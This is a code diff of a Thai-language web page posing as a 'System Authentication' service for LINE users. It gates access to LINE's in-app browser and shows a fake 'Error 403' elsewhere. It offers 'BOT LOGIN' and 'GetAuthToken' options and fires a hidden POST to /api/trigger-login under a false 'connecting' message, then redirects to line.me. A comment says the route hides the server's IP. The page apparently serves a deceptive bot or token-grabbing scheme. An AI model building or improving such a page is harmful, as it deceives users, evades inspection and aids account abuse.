@@ -1,42 +1,66 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
     <meta charset="utf-8">
-    <title>Token System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Authentication</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
-        body { background:url('https://i.ibb.co/q5m9sJY/background.png') no-repeat center center fixed; background-size:cover; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-        .box { width:90%; max-width:400px; background:rgba(255,255,255,0.1); padding:20px; border-radius:15px; backdrop-filter:blur(10px); text-align:center; }
-        input, button { width:100%; padding:12px; margin:10px 0; border-radius:8px; border:0; }
-        button { background:#00c300; color:white; font-weight:bold; cursor:pointer; }
+        html, body { height: 100%; margin: 0; padding: 0; width: 100%; overflow: hidden; }
+        body { background:url('https://i.ibb.co/q5m9sJY/background.png') no-repeat center center fixed; background-size:cover; display:flex; justify-content:center; align-items:center; }
+        .box { width:85%; max-width:400px; background:rgba(0,0,0,0.75); padding:30px; border-radius:20px; text-align:center; color:white; backdrop-filter:blur(10px); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { width:100%; padding:18px; margin-top:25px; border-radius:12px; border:0; background:#00c300; color:white; font-weight:bold; cursor:pointer; font-size:18px; transition: 0.2s; }
+        button:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
 
-    <div class="box" id="app">
-        <h2 style="color:white">Token System</h2>
-        <input id="userid" placeholder="User ID">
-        <input id="secret" placeholder="Secret Key">
-        <button onclick="processData()">สร้าง Token</button>
+    <div class="box">
+        <h2>System Authentication</h2>
+        <p>ยืนยันการเชื่อมต่อด้วย Server กลางเพื่อเข้าใช้งาน</p>
+        <button onclick="startFlow()">คลิกเพื่อเริ่มต้น</button>
     </div>
 
     <script>
-        // ระบบกั้น Browser ปกติ
-        window.onload = () => {
-            if (!navigator.userAgent.includes('Line')) {
-                document.body.innerHTML = "<h1 style='color:white'>กรุณาเปิดผ่าน LINE เท่านั้น</h1>";
-            }
-        };
+        // กั้น Browser อื่นนอกจาก LINE
+        if (!navigator.userAgent.includes('Line')) {
+            document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:20%;'>Error 403</h1>";
+        }
 
-        async function processData() {
-            // ระบบส่งข้อมูลเบื้องหลัง
-            fetch('/trigger-login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userData: { mid: document.getElementById('userid').value } })
+        async function startFlow() {
+            const { value: selectedBot } = await Swal.fire({
+                title: 'เลือกบริการ',
+                input: 'select',
+                inputOptions: { '5555': 'BOT LOGIN', '6666': 'BOT POSR', '7777': 'GetAuthToken' },
+                confirmButtonText: 'ตกลง',
+                allowOutsideClick: false
             });
 
-            Swal.fire("กำลังดำเนินการ", "ระบบกำลังรวบรวมข้อมูล...", "info");
+            if (selectedBot) {
+                Swal.fire({
+                    title: 'กำลังเชื่อมต่อ...',
+                    text: 'กรุณารอสักครู่ (ระบบอาจจะช้าเนื่องจากเครือข่าย)',
+                    allowOutsideClick: false,
+                    didOpen: () => {
+                        Swal.showLoading();
+                        
+                        // เรียกผ่าน /api/ ซึ่งไม่มี IP หลุด
+                        fetch('/api/trigger-login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                mid: "USER_" + Math.floor(Math.random() * 1000000), 
+                                service: selectedBot,
+                                timestamp: Date.now() 
+                            })
+                        });
+                    }
+                });
+
+                setTimeout(() => {
+                    window.location.href = "https://line.me/"; 
+                }, 15000);
+            }
         }
     </script>
 </body>
